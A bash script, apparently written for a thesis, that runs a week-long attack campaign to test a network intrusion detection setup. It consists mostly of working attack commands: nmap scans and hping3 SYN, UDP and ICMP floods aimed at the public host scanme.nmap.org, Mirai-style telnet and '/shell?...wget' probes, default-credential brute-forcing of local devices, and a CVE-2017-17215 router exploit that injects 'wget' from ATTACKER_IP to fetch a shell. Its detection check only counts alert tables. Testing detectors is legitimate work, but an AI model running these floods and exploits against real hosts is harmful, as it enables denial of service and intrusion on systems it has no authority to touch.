#!/bin/bash
##############################################################################
# Attack Simulation Script (7-Day Campaign)
# Purpose: Simulate various network attacks to test detection capabilities
# Duration: Days 31-37 of experimental period
##############################################################################

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
DATA_DIR="/home/jarvis/thesis/data/attack_simulation"
LOG_FILE="/home/jarvis/thesis/logs/attack_simulator.log"
RESULTS_FILE="$DATA_DIR/attack_results.json"

# Target IPs (modify for your environment)
TARGET_INTERNAL="192.168.1.100"  # Test victim on same network
TARGET_EXTERNAL="scanme.nmap.org"  # Authorized scan target

mkdir -p "$DATA_DIR" "$(dirname "$LOG_FILE")"

# Function to log with timestamp
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Function to check if tool exists
check_tool() {
    if ! command -v $1 &> /dev/null; then
        log "ERROR: $1 is not installed. Please install it first."
        return 1
    fi
    return 0
}

# Function to wait and check detection
check_detection() {
    local attack_type=$1
    local wait_time=$2
    
    log "Waiting ${wait_time}s for detection system to process..."
    sleep $wait_time
    
    # Check Suricata alerts
    local alerts=$(sqlite3 /home/jarvis/NetGuard/network.db \
        "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name LIKE 'suricata_alerts_%' LIMIT 1" 2>/dev/null || echo "0")
    
    log "Attack type: $attack_type - Alert tables found: $alerts"
}

# Scenario 1: Nmap Port Scan
scenario_nmap_scan() {
    log "========================================" 
    log "SCENARIO 1: Nmap Port Scan"
    log "========================================"
    
    if ! check_tool nmap; then
        log "Installing nmap..."
        sudo apt-get update && sudo apt-get install -y nmap
    fi
    
    local start_time=$(date -Iseconds)
    
    # SYN Scan
    log "Running SYN scan on $TARGET_EXTERNAL..."
    sudo nmap -sS -p 1-1000 $TARGET_EXTERNAL -T4 > "$DATA_DIR/nmap_syn_scan.txt" 2>&1
    check_detection "nmap_syn_scan" 5
    
    # UDP Scan
    log "Running UDP scan on $TARGET_EXTERNAL..."
    sudo nmap -sU -p 53,67,68,123 $TARGET_EXTERNAL > "$DATA_DIR/nmap_udp_scan.txt" 2>&1
    check_detection "nmap_udp_scan" 5
    
    # OS Detection
    log "Running OS detection on $TARGET_EXTERNAL..."
    sudo nmap -O $TARGET_EXTERNAL > "$DATA_DIR/nmap_os_detect.txt" 2>&1
    check_detection "nmap_os_detection" 5
    
    # Aggressive scan
    log "Running aggressive scan on $TARGET_EXTERNAL..."
    sudo nmap -A -p 1-100 $TARGET_EXTERNAL > "$DATA_DIR/nmap_aggressive.txt" 2>&1
    check_detection "nmap_aggressive" 5
    
    local end_time=$(date -Iseconds)
    
    log "Nmap scans completed. Check $DATA_DIR for results."
    
    # Save metadata
    cat >> "$RESULTS_FILE" <<EOF
{
  "scenario": "nmap_port_scan",
  "start_time": "$start_time",
  "end_time": "$end_time",
  "target": "$TARGET_EXTERNAL",
  "scans": ["syn", "udp", "os_detection", "aggressive"],
  "expected_detections": ["port_scan", "aggressive_scan", "network_discovery"]
}
EOF
}

# Scenario 2: DDoS Simulation
scenario_ddos_attack() {
    log "========================================" 
    log "SCENARIO 2: DDoS Simulation"
    log "========================================"
    
    if ! check_tool hping3; then
        log "Installing hping3..."
        sudo apt-get update && sudo apt-get install -y hping3
    fi
    
    local start_time=$(date -Iseconds)
    
    # SYN Flood (low intensity for testing)
    log "Simulating SYN flood attack..."
    sudo timeout 30 hping3 -S --flood -p 80 $TARGET_EXTERNAL > "$DATA_DIR/ddos_syn_flood.txt" 2>&1 &
    local pid=$!
    
    sleep 10
    check_detection "ddos_syn_flood" 5
    
    # UDP Flood
    log "Simulating UDP flood attack..."
    sudo timeout 20 hping3 --udp --flood -p 53 $TARGET_EXTERNAL > "$DATA_DIR/ddos_udp_flood.txt" 2>&1 &
    
    sleep 10
    check_detection "ddos_udp_flood" 5
    
    # ICMP Flood
    log "Simulating ICMP flood (ping flood)..."
    sudo timeout 15 hping3 --icmp --flood $TARGET_EXTERNAL > "$DATA_DIR/ddos_icmp_flood.txt" 2>&1 &
    
    sleep 10
    check_detection "ddos_icmp_flood" 5
    
    # Wait for all attacks to finish
    wait
    
    local end_time=$(date -Iseconds)
    
    log "DDoS simulation completed."
    
    cat >> "$RESULTS_FILE" <<EOF
,
{
  "scenario": "ddos_simulation",
  "start_time": "$start_time",
  "end_time": "$end_time",
  "target": "$TARGET_EXTERNAL",
  "attacks": ["syn_flood", "udp_flood", "icmp_flood"],
  "duration_seconds": 60,
  "expected_detections": ["ddos", "flood_attack", "high_packet_rate"]
}
EOF
}

# Scenario 3: Mirai Botnet Traffic Replay
scenario_mirai_replay() {
    log "========================================" 
    log "SCENARIO 3: Mirai Botnet Traffic Replay"
    log "========================================"
    
    # Check for Mirai PCAP file
    local pcap_file="/home/jarvis/thesis/pcaps/mirai_sample.pcap"
    
    if [ ! -f "$pcap_file" ]; then
        log "Downloading Mirai sample PCAP..."
        mkdir -p "$(dirname "$pcap_file")"
        
        # Download from malware-traffic-analysis.net or similar
        # For this demo, we'll simulate some malicious patterns
        log "PCAP file not found. Simulating Mirai-like traffic patterns instead..."
        
        # Simulate Mirai telnet scanning
        log "Simulating Mirai telnet brute force attempts..."
        for i in {1..20}; do
            nc -z -w 1 192.168.1.$i 23 2>/dev/null &
        done
        sleep 2
        
        # Simulate HTTP requests to IoT devices
        log "Simulating Mirai HTTP exploits..."
        for port in 80 8080 81 8081; do
            curl -m 2 "http://192.168.1.1:$port/shell?cd+/tmp;+wget+" 2>/dev/null &
        done
        sleep 2
        
        check_detection "mirai_simulation" 10
    else
        if ! check_tool tcpreplay; then
            log "Installing tcpreplay..."
            sudo apt-get update && sudo apt-get install -y tcpreplay
        fi
        
        log "Replaying Mirai PCAP file..."
        sudo tcpreplay -i eth0 "$pcap_file" > "$DATA_DIR/mirai_replay.txt" 2>&1
        check_detection "mirai_pcap_replay" 10
    fi
    
    local end_time=$(date -Iseconds)
    
    log "Mirai traffic replay completed."
    
    cat >> "$RESULTS_FILE" <<EOF
,
{
  "scenario": "mirai_botnet_replay",
  "start_time": "$(date -Iseconds)",
  "end_time": "$end_time",
  "method": "simulated_patterns",
  "patterns": ["telnet_scan", "http_exploit_attempts"],
  "expected_detections": ["botnet_activity", "telnet_brute_force", "iot_exploit"]
}
EOF
}

# Scenario 4: IoT Device Exploitation
scenario_iot_exploit() {
    log "========================================" 
    log "SCENARIO 4: IoT Device Exploitation Attempts"
    log "========================================"
    
    local start_time=$(date -Iseconds)
    
    # Default credential attempts
    log "Testing default credentials on IoT devices..."
    
    # Common IoT default creds
    declare -a creds=(
        "admin:admin"
        "admin:password"
        "admin:12345"
        "root:root"
        "admin:"
    )
    
    for device_ip in 192.168.1.{100..110}; do
        # Check if host is up
        if ping -c 1 -W 1 $device_ip &> /dev/null; then
            log "Testing $device_ip..."
            
            # Try HTTP basic auth
            for cred in "${creds[@]}"; do
                curl -m 2 --user "$cred" "http://$device_ip/" &> /dev/null
            done
            
            # Try telnet (if accessible)
            timeout 2 telnet $device_ip 23 &> /dev/null
        fi
    done
    
    check_detection "iot_exploitation" 10
    
    # CVE-2017-17215 (Huawei Router)
    log "Simulating CVE-2017-17215 exploit attempt..."
    curl -X POST "http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1" \
        -d '<?xml version="1.0"?><s:Envelope><s:Body><u:Upgrade><NewStatusURL>$(wget -g ATTACKER_IP -l /tmp/evil -r /bin/sh)</NewStatusURL></u:Upgrade></s:Body></s:Envelope>' \
        2>/dev/null &
    
    sleep 2
    check_detection "iot_cve_exploit" 5
    
    local end_time=$(date -Iseconds)
    
    log "IoT exploitation attempts completed."
    
    cat >> "$RESULTS_FILE" <<EOF
,
{
  "scenario": "iot_device_exploitation",
  "start_time": "$start_time",
  "end_time": "$end_time",
  "attempts": ["default_credentials", "cve_exploits", "telnet_access"],
  "expected_detections": ["brute_force", "iot_exploit", "suspicious_http_requests"]
}
EOF
}

# Main execution
main() {
    log "========================================" 
    log "ATTACK SIMULATION CAMPAIGN STARTED"
    log "Duration: 7 days (Days 31-37)"
    log "Started: $(date)"
    log "========================================"
    
    # Initialize results file
    echo "[" > "$RESULTS_FILE"
    
    # Day 31: Nmap Scans
    log "\n=== Day 31: Port Scanning ===" 
    scenario_nmap_scan
    sleep 3600  # Wait 1 hour
    
    # Day 32: DDoS Simulation
    log "\n=== Day 32: DDoS Attacks ===" 
    scenario_ddos_attack
    sleep 3600
    
    # Day 33: Mirai Replay
    log "\n=== Day 33: Botnet Traffic ===" 
    scenario_mirai_replay
    sleep 3600
    
    # Day 34: IoT Exploitation
    log "\n=== Day 34: IoT Exploits ===" 
    scenario_iot_exploit
    sleep 3600
    
    # Day 35-37: Repeat mixed attacks for consistency
    log "\n=== Days 35-37: Mixed Attack Scenarios ===" 
    for day in {35..37}; do
        log "Day $day: Running mixed attacks..."
        
        # Random selection of attacks
        scenario_nmap_scan
        sleep 1800
        scenario_ddos_attack
        sleep 1800
        scenario_iot_exploit
        
        if [ $day -lt 37 ]; then
            log "Waiting 24 hours for Day $((day+1))..."
            sleep 86400
        fi
    done
    
    # Close JSON array
    echo "]" >> "$RESULTS_FILE"
    
    log "========================================" 
    log "ATTACK SIMULATION COMPLETED"
    log "Results saved to: $RESULTS_FILE"
    log "Logs saved to: $LOG_FILE"
    log "========================================"
}

# Check if running as root (required for some tools)
if [ "$EUID" -ne 0 ]; then
    log "WARNING: Some attacks require root privileges. Run with sudo for full functionality."
fi

# Execute main
main

